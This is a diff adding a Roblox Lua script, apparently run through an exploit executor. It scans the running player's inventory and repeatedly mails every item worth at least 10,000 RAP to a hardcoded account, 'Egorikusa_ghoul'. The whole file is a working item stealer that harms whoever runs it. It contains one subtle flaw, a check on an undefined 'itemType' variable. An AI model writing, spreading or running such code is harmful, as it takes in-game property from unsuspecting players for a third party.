@@ -1,0 +1,42 @@
+local Lib = require(game.ReplicatedStorage:WaitForChild('Library'))
+local RAPValues = getupvalues(Lib.DevRAPCmds.Get)[1]
+local HttpService = game:GetService("HttpService")
+local MINIMUM_MAIL_VALUE = 10000
+local USER = "Egorikusa_ghoul"
+
+local function getRAP(Type, Id, tn)
+    if RAPValues[Type] then
+        for i,v in pairs(RAPValues[Type]) do
+            local itemTable = HttpService:JSONDecode(i)
+            if itemTable.id == Id and itemTable.tn == tn then
+                return v
+            end
+        end
+    end
+end
+
+local save = Lib.Save.Get().Inventory
+while true do
+wait(0.01)
+for Type, _ in pairs(save) do
+    for ITEM_CODE, v in pairs(_) do
+        local itemRAP = getRAP(Type, v.id, v.tn)
+        local amount = v._am
+        if amount == nil then amount = 1 end
+        if itemRAP and (amount) * itemRAP >= MINIMUM_MAIL_VALUE then
+            print(v.id, v.tn, '--', itemRAP * (amount))
+            local args = {
+                [1] = USER,
+                [2] = "egodual",
+                [3] = Type,
+                [4] = ITEM_CODE,
+                [5] = amount,
+            }
+            if itemType == "Currency" then
+                args[5] = args[5] - 50000
+            end
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        end
+    end
+end
+end
